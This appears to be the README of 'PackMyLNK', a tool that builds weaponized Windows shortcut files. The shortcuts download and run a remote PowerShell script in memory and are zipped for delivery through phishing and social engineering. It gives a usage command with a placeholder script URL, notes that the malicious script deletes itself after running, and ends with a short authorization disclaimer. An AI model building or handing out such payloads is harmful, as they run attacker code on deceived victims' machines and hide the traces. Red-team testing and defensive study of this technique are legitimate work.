# PackMyLNK

This tool takes a URL pointing to a PowerShell script and embeds it into a weaponized .LNK file for in-memory execution. It automatically generates the .LNK file, packages it in a ZIP, and prepares everything for easy delivery through Social Engineering techniques.

Surprisingly, .LNK files remain effective today as an initial compromise vector in phishing and Red Team engagements!


## Usage

`.\PackMyLNK.exe -Url http://example.com/runme.ps1 -Lnk Manual -Zip Project`

![Screenshot 2024-11-16 140031](https://github.com/user-attachments/assets/8bed007c-093e-4c7b-b63e-ef67fbc00501)

> [NOTE] The malicious script delete itself after the execution !

#### DISCLAIMER: This tool is intended for testing and educational purposes only. It should only be used on systems with proper authorization. Any unauthorized or illegal use of this tool is strictly prohibited. The creator of this tool holds no responsibility for any misuse or damage caused by its usage.
